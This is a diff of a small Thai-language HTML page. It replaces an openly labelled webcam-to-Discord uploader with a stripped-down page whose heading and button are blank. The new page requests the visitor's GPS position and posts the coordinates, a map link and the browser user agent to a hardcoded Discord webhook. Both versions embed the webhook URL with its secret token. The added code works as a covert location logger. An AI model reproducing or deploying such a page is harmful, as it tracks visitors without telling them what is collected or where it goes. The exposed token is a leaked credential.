@@ -1,98 +1,57 @@
 <!DOCTYPE html>
-<html lang="th">
+<html>
 <head>
   <meta charset="UTF-8">
-  <title>ส่งภาพไปยัง Discord</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      max-width: 600px;
-      margin: auto;
-      padding: 20px;
-    }
-    video, img {
-      width: 100%;
-      margin-top: 10px;
-      border-radius: 8px;
-    }
-    button {
-      margin-top: 10px;
-      padding: 10px 20px;
-      font-size: 16px;
-    }
-    #status {
-      margin-top: 15px;
-      font-weight: bold;
-    }
-  </style>
+  <title>skibidi/title>
 </head>
 <body>
-  <h2>📸 ถ่ายภาพและส่งไปยัง Discord</h2>
-  <p>อนุญาตให้เข้าถึงกล้อง และกดถ่ายภาพเพื่อส่งไปยัง Discord</p>
-
-  <button onclick="startCamera()">🎥 เปิดกล้อง</button>
-  <video id="video" autoplay playsinline></video>
-  <button onclick="takePhoto()">📤 ถ่ายและส่งภาพ</button>
-
-  <canvas id="canvas" style="display:none;"></canvas>
-  <img id="preview" style="display:none;" alt="ภาพตัวอย่าง">
-  <div id="status">⏳ ยังไม่มีภาพส่ง</div>
+  <h2>📍 </h2>
+  <button onclick="getLocation()">📤 </button>
+  <p id="status">ยังไม่มีการส่งข้อมูล</p>
 
   <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const preview = document.getElementById('preview');
-    const status = document.getElementById('status');
+    const webhookUrl = "https://discord.com/api/webhooks/1380863471041777724/EONsTADIyl9QbykL2d3oq7_YyQO_BDvgucT0j2yiZkkjHypony6HReLk8MXAphuiUdCr";
 
-    const webhookUrl = 'https://discord.com/api/webhooks/1380863471041777724/EONsTADIyl9QbykL2d3oq7_YyQO_BDvgucT0j2yiZkkjHypony6HReLk8MXAphuiUdCr';
-
-    async function startCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        status.innerText = "✅ กล้องพร้อมใช้งาน";
-      } catch (err) {
-        status.innerText = "❌ เปิดกล้องไม่สำเร็จ: " + err.message;
+    function getLocation() {
+      document.getElementById("status").innerText = "⏳ ...";
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendToDiscord, showError);
+      } else {
+        document.getElementById("status").innerText = "❌ เบราว์เซอร์ไม่รองรับ GPS";
       }
     }
 
-    async function takePhoto() {
-      // ถ่ายภาพลง Canvas
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      const dataUrl = canvas.toDataURL('image/png');
+    function sendToDiscord(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+      const userAgent = navigator.userAgent;
 
-      // แสดงตัวอย่างภาพ
-      preview.src = dataUrl;
-      preview.style.display = 'block';
+      const data = {
+        content: `📍 มีผู้ใช้ส่งตำแหน่ง:\n\n🌐 [ดูบนแผนที่](${mapUrl})\n📌 พิกัด: ${lat}, ${lon}\n💻 อุปกรณ์: ${userAgent}`
+      };
 
-      // แปลง base64 เป็น Blob
-      const blob = await (await fetch(dataUrl)).blob();
-
-      // สร้างฟอร์ม
-      const formData = new FormData();
-      formData.append('file', blob, 'photo.png');
-      formData.append('payload_json', JSON.stringify({
-        content: "📸 มีผู้ใช้ส่งภาพจากกล้อง"
-      }));
-
-      // ส่งไปยัง Discord
-      status.innerText = "⏳ กำลังส่งภาพ...";
       fetch(webhookUrl, {
-        method: 'POST',
-        body: formData
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
       })
-      .then(res => {
-        if (res.ok) {
-          status.innerText = "✅ ส่งภาพไปยัง Discord เรียบร้อยแล้ว!";
+      .then(response => {
+        if (response.ok) {
+          document.getElementById("status").innerText = "✅ ส่งตำแหน่งไปยัง Discord เรียบร้อยแล้ว!";
         } else {
-          status.innerText = "❌ ส่งไม่สำเร็จ: " + res.status;
+          document.getElementById("status").innerText = "❌ ส่งข้อมูลไม่สำเร็จ";
         }
       })
-      .catch(err => {
-        status.innerText = "❌ ข้อผิดพลาด: " + err.message;
+      .catch(error => {
+        document.getElementById("status").innerText = "❌ เกิดข้อผิดพลาด: " + error;
       });
+    }
+
+    function showError(error) {
+      document.getElementById("status").innerText = "❌ ไม่สามารถระบุตำแหน่งได้ (" + error.message + ")";
     }
   </script>
 </body>
